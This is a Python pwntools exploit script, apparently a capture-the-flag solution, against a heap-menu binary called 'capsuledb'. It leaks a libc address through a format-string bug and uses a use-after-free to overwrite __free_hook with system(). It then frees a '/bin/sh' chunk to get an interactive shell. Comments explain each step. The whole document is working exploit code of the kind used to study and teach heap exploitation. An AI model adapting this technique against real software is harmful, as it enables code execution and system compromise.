from pwn import *

elf = context.binary = ELF("./capsuledb-1_1", checksec=False)

proc = process()
#proc = remote("127.0.0.1",6666)

#gdb.attach(proc,"""continue
#""")

indexcount = 0
def malloc(size,data):
    #sleep(0.1)
    #proc.recvuntil(b"> ")
    proc.sendline(b"1")
    sleep(0.1)
    #proc.recvuntil(b"]: ")
    proc.sendline(b"2")
    sleep(0.1)
    #proc.recvuntil(b"Size: ")
    proc.sendline(f"{size}".encode())
    sleep(0.1)
    #proc.recvuntil(b"Data:")
    proc.sendline(data)
    sleep(0.1)
    #proc.recvlines(10)
    global indexcount
    indexcount = indexcount+1
    return indexcount-1

def free(index):
    #proc.recvuntil(b"> ")
    sleep(0.1)
    proc.sendline(b"3")
    sleep(0.1)
    #proc.recvuntil(b"Index?: ")
    proc.sendline(f"{index}".encode())
    sleep(0.1)

def edit(index,data):
    #proc.recvuntil(b"> ")
    sleep(0.1)
    proc.sendline(b"2")
    #proc.recvuntil(b"Index: ")
    sleep(0.1)
    proc.sendline(f"{index}".encode())
    #proc.recvuntil(b"]: ")
    sleep(0.1)
    proc.sendline(b"2")
    #proc.recvuntil(b"Data:")
    sleep(0.1)
    proc.sendline(data)
    sleep(0.1)
    #proc.recvlines(2)


def view_data(index):
    sleep(0.1)
    proc.sendline(b"4")
    sleep(0.1)
    proc.sendline(f"{index}".encode())
    sleep(0.1)
    proc.sendline(b"2")
    proc.recvuntil(b" *********")
    proc.recvline()
    data=proc.recvline().strip(b"\n")
    return data

def use_after_free():
    libc = context.binary = ELF("./libc.so.6", checksec=False)
    leak_chunk=malloc(60,b"A")
    edit(leak_chunk,b"%10$p")# Libc leak using format string vulnerability, offset 10 leaks a libc address
    libc_leak = view_data(leak_chunk)

    libc_base = int(libc_leak,16) - 0x3ab2a0 # Libc base address from leak
    libc.address = libc_base

    print(hex(libc_base)) # Libc base

    one_gadget = libc_base + 0x41596
    fake_chunk = malloc(60,b"/bin/sh\x00") # Create a chunk that holds string "/bin/sh", later to be used in system() function

    chunk1=malloc(60,b"A") # Create Chunk1

    free(chunk1) # Free Chunk1
    edit(chunk1, p64(libc.sym.__free_hook)) # Use-After-Free: Edit Freed Chunk

    chunk2=malloc(60,b"A") # use chunk1 - Un-Free Chunk1




    system = libc_base + 0x41710 #- 0x2b2f0
    puts = libc_base + 0x6dba0
    printf = libc_base + 0x54990

    chunk3 = malloc(60,p64(system)) # Arbitrary write access to free_hook and write system()'s address to free_hook

    #view_data(fake_chunk)
    free(fake_chunk) # Calling free() would execute system(): free(*fake_chunk = /bin/sh) -> system(*fake_chunk = /bin/sh)
use_after_free()




sleep(0.1)
proc.recvuntil(b"5/16\n")
proc.interactive()
